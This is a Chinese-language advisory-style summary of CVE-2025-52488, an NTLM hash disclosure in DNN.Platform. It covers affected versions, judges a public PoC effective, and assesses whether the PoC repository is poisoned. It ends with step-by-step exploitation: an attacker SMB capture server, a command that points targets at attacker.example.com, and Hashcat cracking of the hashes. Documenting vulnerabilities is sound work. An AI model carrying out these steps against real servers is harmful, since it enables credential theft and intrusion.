## CVE-2025-52488-DNN.Platform-NTLM Hash Disclosure

**漏洞编号:** CVE-2025-52488

**漏洞类型:** NTLM Hash Disclosure

**影响应用:** DNN.Platform

**危害等级:** 高危，可能导致权限提升和横向渗透

**影响版本:** 6.0.0 to before 10.0.1

**利用条件:** 需要网络访问，目标服务器运行受影响的DNN版本，攻击者控制的SMB服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-52488是DNN平台中的一个漏洞，攻击者可以通过精心构造的恶意交互，将NTLM哈希暴露给第三方的SMB服务器。该漏洞利用了Windows/.NET框架的特性和Unicode路径规范化中的缺陷，迫使目标DNN服务器向攻击者控制的服务器发起SMB请求，并在身份验证过程中泄露NTLM哈希。

**有效性评估：**

*   提供的POC代码能够通过构造特定的请求，诱使DNN服务器向攻击者控制的SMB服务器发起连接，从而捕获NTLM Hash。
*   搜索引擎结果也证实了该漏洞的存在和危害，并提供了缓解措施。
*   漏洞库信息明确指出该漏洞的成因和受影响的版本范围。

综合来看，该POC代码是有效的。

**投毒风险分析：**

POC代码的主要功能是发送精心构造的请求，并监听SMB流量以捕获NTLM哈希。代码中可能存在以下潜在的投毒风险：

1.  **依赖项风险：** `requirements.txt` 文件中可能包含恶意或受污染的第三方库，这些库可能被用于执行恶意操作。
2.  **SMB服务器交互：**  POC代码需要连接攻击者控制的SMB服务器，如果该服务器被篡改或存在漏洞，可能导致攻击者主机受到攻击。
3. **编码问题:**  代码存在一些编码问题,例如Logger类中的`w`函数未完成,这可能导致一些错误。

根据代码分析和已知的漏洞利用方式，投毒风险较低，大约为10%。大部分代码逻辑集中在漏洞利用本身，没有明显的后门或恶意代码。

**利用方式：**

1.  **目标确定：** 确定运行DNN平台且版本在6.0.0到10.0.1之间的目标服务器。
2.  **SMB服务器搭建：** 搭建一个SMB服务器，例如使用Responder或Burp Collaborator，用于捕获NTLM哈希。
3.  **目标列表准备：** 创建一个包含目标URL的文本文件（targets.txt），每行一个URL。
4.  **漏洞利用：** 运行POC代码，指定目标列表文件和SMB服务器地址。例如：`python main.py targets.txt attacker.example.com`
5.  **NTLM哈希捕获：** 监控SMB服务器，等待目标服务器发起连接并捕获NTLM哈希。
6.  **哈希破解：** 使用哈希破解工具（例如Hashcat）破解捕获到的NTLM哈希，获取用户凭据。

攻击者可以利用获取到的用户凭据登录DNN平台，进行恶意操作，例如数据窃取、篡改或植入恶意代码。

**项目地址:** [SystemVll/CVE-2025-52488](https://github.com/SystemVll/CVE-2025-52488)

**漏洞详情:** [CVE-2025-52488](https://nvd.nist.gov/vuln/detail/CVE-2025-52488)